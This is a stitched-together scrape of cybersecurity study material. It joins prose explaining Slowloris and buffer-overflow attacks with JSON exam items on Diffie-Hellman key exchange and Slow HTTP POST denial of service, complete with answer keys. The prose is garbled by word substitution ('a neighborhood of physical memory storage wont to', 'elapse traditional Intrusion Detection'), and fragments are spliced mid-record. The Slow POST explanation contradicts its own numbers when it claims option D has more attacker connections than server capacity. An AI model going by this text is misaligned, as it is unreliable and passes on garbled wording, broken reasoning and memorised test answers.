Due the straightforward yet elegant nature of this attack, it requires minimal bandwidth to implement and affects the target server’s web server only, with almost no side effects on other services and ports.Slowloris has proven highly-effective against many popular sorts of web server software, including Apache 1.x and 2.x.Over the years, Slowloris has been credited with variety of high-profile server takedowns. Notably, it had been used extensively by Iranian ‘hackivists’ following the 2009 Iranian presidential election to attack Iranian government internet sites .Slowloris works by opening multiple connections to the targeted web server and keeping them open as long as possible. It does this by continuously sending partial HTTP requests, none of which are ever completed. The attacked servers open more and connections open, expecting each of the attack requests to be completed.Periodically, the Slowloris sends subsequent HTTP headers for every request, but never actually completes the request. Ultimately, the targeted server’s maximum concurrent connection pool is filled, and extra (legitimate) connection attempts are denied. By sending partial, as against malformed, packets, Slowloris can easily elapse traditional Intrusion Detection systems.Named after a kind of slow-moving Asian primate, Slowloris really does win the race by moving slowly and steadily.

{"id": 231, "topic": 3, "question": "Your company, SecureTech Inc., is planning to transmit some sensitive data over an unsecured communication channel. As a cyber security expert, you decide to use symmetric key encryption to protect the data. However, you must also ensure the secure exchange of the symmetric key. Which of the following protocols would you recommend to the team to achieve this?", "options": {"A": "Implementing SSL certificates on your company's web servers.", "B": "Applying the Diffie-Hellman protocol to exchange the symmetric key.", "C": "Switching all data transmission to the HTTPS protocol.", "D": "Utilizing SSH for secure remote logins to the servers."}, "answer": ["B"], "explanation": "The protocol that you would recommend to the team to achieve the secure exchange of the symmetric key is the Diffie-Hellman protocol. The Diffie-Hellman protocol is a key agreement protocol that allows two or more parties to establish a shared secret key over an unsecured communication channel, without having to exchange the key itself. The Diffie-Hellman protocol works as follows12: The parties agree on a large prime number p and a generator g, which are public parameters that can be known by anyone. Each party chooses a random private number a or b, which are kept secret from anyone else. Each party computes a public value A or B, by raising g to the power of a or b modulo p, i.e., A = g^a mod p and B = g^b mod p. Each party sends their public value A or B to the other party over the unsecured channel. Each party computes the shared secret key K, by raising the received public value to the power of their own private number modulo p, i.e., K = A^b mod p = B^a mod p. The parties can now use the shared secret key K to encrypt and decrypt the data using a symmetric key encryption algorithm, such as AES or 3DES. The Diffie-Hellman protocol can ensure the secure exchange of the symmetric key because it relies on the mathematical difficulty of computing discrete logarithms, which means that it is hard to find the private numbers a or b given the public values A or B, g, and p. Therefore, an attacker who intercepts the public values A or B cannot easily compute the shared secret key K, and thus cannot decrypt the data encrypted with K12. The other options are not as appropriate as option B for the following reasons: A. Implementing SSL certificates on your company’s web servers: This option is not relevant because SSL certificates are not used to exchange symmetric keys, but to authenticate the identity of the web servers and to establish a secure connection using public key encryption. SSL certificates are digital certificates that contain the public key and the identity information of the web server, and are issued and signed by a trusted certificate authority (CA). When a client connects to a web server, the web server sends its SSL certificate to the client, who verifies it with the CA. If the verification is successful, the client and the web server use the public key in the certificate to exchange a symmetric key, which is then used to encrypt and decrypt the data. However, this option does not address the scenario of transmitting data over an unsecured communication channel, which may not involve web servers or SSL certificates34. C. Switching all data transmission to the HTTPS protocol: This option is not sufficient because HTTPS protocol is not a protocol for exchanging symmetric keys, but a protocol for securing web traffic using SSL or TLS encryption. HTTPS protocol is a combination of HTTP protocol and SSL or TLS protocol, which means that it uses HTTP for the application layer communication and SSL or TLS for the transport layer encryption..."}

In other words, an excessive amount of information is being passed into a container that doesn’t have enough space, which information finishes up replacing data in adjacent containers.Buffer overflows are often exploited by attackers with a goal of modifying a computer’s memory so as to undermine or take hold of program execution. What’s a buffer?A buffer, or data buffer, is a neighborhood of physical memory storage wont to temporarily store data while it’s being moved from one place to a different . These buffers typically sleep in RAM memory. Computers frequently use buffers to assist improve performance; latest hard drives cash in of buffering to efficiently access data, and lots of online services also use buffers. for instance , buffers are frequently utilized in online video streaming to stop interruption. When a video is streamed, the video player downloads and stores perhaps 20% of the video at a time during a buffer then streams from that buffer. This way, minor drops in connection speed or quick service disruptions won’t affect the video stream performance. Buffers are designed to contain specific amounts of knowledge . Unless the program utilizing the buffer has built-in instructions to discard data when an excessive amount of is shipped to the buffer, the program will overwrite data in memory adjacent to the buffer.Buffer overflows are often exploited by attackers to corrupt software. Despite being well-understood, buffer overflow attacks are still a serious security problem that torment cyber-security teams. In 2014 a threat referred to as ‘heartbleed’ exposed many many users to attack due to a buffer overflow vulnerability in SSL software. How do attackers exploit buffer overflows?An attacker can deliberately feed a carefully crafted input into a program which will cause the program to undertake and store that input during a buffer that isn’t large enough, overwriting portions of memory connected to the buffer space. If the memory layout of the program is well-defined, the attacker can deliberately overwrite areas known to contain executable code. The attacker can then replace this code together with his own executable code, which may drastically change how the program is meant to figure .For example if the overwritten part in memory contains a pointer (an object that points to a different place in memory) the attacker’s code could replace that code with another pointer that points to an exploit payload. this will transfer control of the entire program over to theattacker’s code."}

Each connection sends a byte of data every 'b' seconds, effectively holding up the connections for an extended period. Your server is designed to manage 'm' connections per second, but any connections exceeding this number tend to overwhelm the system.

Which is most likely to result in the longest duration of server unavailability?", "options": {"A": "m=110, b=20: Despite the attacker sending 100 connections, the server can handle 110 connections per second, therefore likely staying operative", "B": "m=90, b=15: The server can manage 90 connections per second, but the attacker's 100 connections exceed this, and with each connection held up for 15 seconds, the attack duration could be significant", "C": "m=95, b=10: Here, the server can handle 95 connections per second, but it falls short against the attacker's 100 connections, albeit the hold-up time per connection is lower", "D": "m=105, b=12: The server can manage 105 connections per second, more than the attacker's 100 connections"}, "answer": ["B"], "explanation": "A Slow HTTP POST attack is a type of denial-of-service (DoS) attack that exploits the way web servers handle HTTP requests. The attacker sends a legitimate HTTP POST header to the web server, specifying a large amount of data to be sent in the request body. However, the attacker then sends the data very slowly, keeping the connection open and occupying the server’s resources. The attacker can launch multiple such connections, exceeding the server’s capacity to handle concurrent requests and preventing legitimate users from accessing the web server. The attack duration D is given by the formula D = a * b, where a is the number of connections and b is the hold-up time per connection. The attacker intends to maximize D by manipulating a and b. The server can manage m connections per second, but any connections exceeding m will overwhelm the system. Therefore, the scenario that is most likely to result in the longest duration of server unavailability is the one where a > m and b is the largest. Among the four options, this is the case for option B, where a = 100, m = 90, and b = 15. In this scenario, D = 100 * 15 = 1500 seconds, which is the longest among the four options. Option A has a larger b, but a < m, so the server can handle the connections without being overwhelmed. Option C has a > m, but a smaller b, so the attack duration is shorter. Option D has a > m, but a smaller b and a smaller difference between a and m, so the attack duration is also shorter. References: What is a Slow POST Attack & How to Prevent One?
